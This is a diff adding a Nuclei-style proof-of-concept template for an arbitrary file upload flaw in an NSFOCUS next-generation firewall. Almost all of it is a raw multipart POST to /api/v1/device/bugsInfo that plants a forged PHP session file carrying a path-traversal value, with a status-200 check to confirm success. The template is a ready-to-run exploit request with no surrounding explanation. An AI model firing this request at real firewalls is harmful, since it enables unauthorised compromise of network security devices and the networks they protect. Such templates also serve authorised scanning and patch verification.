@@ -1,0 +1,35 @@
+id: poc-tge3edzgzxaxag6g
+info:
+  name: 绿盟下一代防火墙resourse.php任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tge3edzgzxaxag6g'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tge3edzgzxaxag6g
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /api/v1/device/bugsInfo HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+
+    --1d52ba2a11ad8a915eddab1a0e85acd9
+
+    Content-Disposition: form-data; name="file"; filename="sess_82c13f359d0dd8f51c29d658a9c8ac71"
+
+
+    lang|s:52:"../../../../../../../../../../../../../../../../tmp/";
+
+    --1d52ba2a11ad8a915eddab1a0e85acd9--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
